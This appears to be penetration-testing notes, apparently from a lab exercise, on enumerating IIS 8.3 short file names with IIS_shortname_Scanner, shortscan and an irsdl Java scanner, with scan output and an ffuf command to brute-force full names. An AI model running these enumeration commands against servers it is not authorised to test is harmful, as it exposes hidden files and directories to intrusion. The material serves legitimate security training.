# IIS Short name scanning

### IIS\_shortname\_Scanner

```
git clone https://github.com/lijiejie/IIS_shortname_Scanner.git
```

```
python3 iis_shortname_scan.py http://10.13.38.11 
Dir:  /ds_sto~1
Dir:  /templa~1
Dir:  /trashe~1
Dir:  /newfol~1
python3 iis_shortname_scan.py http://10.13.38.11/dev                             130 ↵ master 
Server is vulnerable, please wait, scanning...
[+] /dev/d~1.*	[scan in progress]
[+] /dev/3~1.*	[scan in progress]
[+] /dev/dc~1.*	[scan in progress]
[+] /dev/ds~1.*	[scan in progress]
[+] /dev/30~1.*	[scan in progress]
[+] /dev/dca~1.*	[scan in progress]
[+] /dev/ds_~1.*	[scan in progress]
[+] /dev/304~1.*	[scan in progress]
[+] /dev/dca6~1.*	[scan in progress]
[+] /dev/ds_s~1.*	[scan in progress]
[+] /dev/304c~1.*	[scan in progress]
[+] /dev/dca66~1.*	[scan in progress]
[+] /dev/ds_st~1.*	[scan in progress]
[+] /dev/304c0~1.*	[scan in progress]
[+] /dev/dca66d~1.*	[scan in progress]
[+] /dev/ds_sto~1.*	[scan in progress]
[+] /dev/304c0c~1.*	[scan in progress]
[+] /dev/dca66d~1	[scan in progress]
[+] Directory /dev/dca66d~1	[Done]
[+] /dev/ds_sto~1	[scan in progress]
[+] Directory /dev/ds_sto~1	[Done]
[+] /dev/304c0c~1	[scan in progress]
[+] Directory /dev/304c0c~1	[Done]
----------------------------------------------------------------
Dir:  /dev/dca66d~1
Dir:  /dev/ds_sto~1
Dir:  /dev/304c0c~1
----------------------------------------------------------------
3 Directories, 0 Files found in total

python3 iis_shortname_scan.py http://10.13.38.11/Images                                master 
Server is vulnerable, please wait, scanning...
[+] /Images/d~1.*	[scan in progress]
[+] /Images/ds~1.*	[scan in progress]
[+] /Images/ds_~1.*	[scan in progress]
[+] /Images/ds_s~1.*	[scan in progress]
[+] /Images/ds_st~1.*	[scan in progress]
[+] /Images/ds_sto~1.*	[scan in progress]
[+] /Images/ds_sto~1	[scan in progress]
[+] Directory /Images/ds_sto~1	[Done]
----------------------------------------------------------------
Dir:  /Images/ds_sto~1
----------------------------------------------------------------
```

* You can continue to walk directories down the web server

```
python3 iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db 
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*	[scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*	[Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
```

* Keep in mind shortname scanning will only give you the first 6 letters and the file extension, you will need to fuzz the remaining words in order to ascertain the full file name

```
ffuf -w wordlist.txt:FUZZ -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/FUZZ.txt -t 1 
```

### Shortscan (Github)

* The best shortname scanner I have found so far
* [https://github.com/bitquark/shortscan](https://github.com/bitquark/shortscan)
* Build both binaries&#x20;

```
// shortutil
go build
// shortscan
go build
```

* Make a shortname wordlist based upon another common wordlist

```
./shortutil wordlist /usr/share/seclists/Discovery/Web-Content/common.txt > common.txt 
```

* Fire up the scanner

```
./shortscan --wordlist ../shortutil/raft-small-words.txt http://10.13.38.11           ✭main 
🌀 Shortscan v0.9.2 · an IIS short filename enumeration tool by bitquark

════════════════════════════════════════════════════════════════════════════════
URL: http://10.13.38.11/
Running: Microsoft-IIS/10.0
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
NEWFOL~2             NEWFOL?    
DS_STO~1             DS_STO?             .DS_STORE
TRASHE~1             TRASHE?    
TEMPLA~1             TEMPLA?             TEMPLATES
WEB~1.CON            WEB.CON?   
NEWFOL~1             NEWFOL?    
════════════════════════════════════════════════════════════════════════════════

════════════════════════════════════════════════════════════════════════════════
URL: http://10.13.38.11/TEMPLATES/
Running: Microsoft-IIS/10.0
Vulnerable: No (or no 8.3 files exist)
════════════════════════════════════════════════════════════════════════════════
```

#### IIS-ShortName-Scanner

* [https://github.com/irsdl/IIS-ShortName-Scanner/tree/master](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master)

```
java -jar iis_shortname_scanner.jar 

# IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2025/10/29 00:58:24
Target: http://10.13.38.11/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/.rem
|_ Extra information:
  |_ Number of sent requests: 27
```
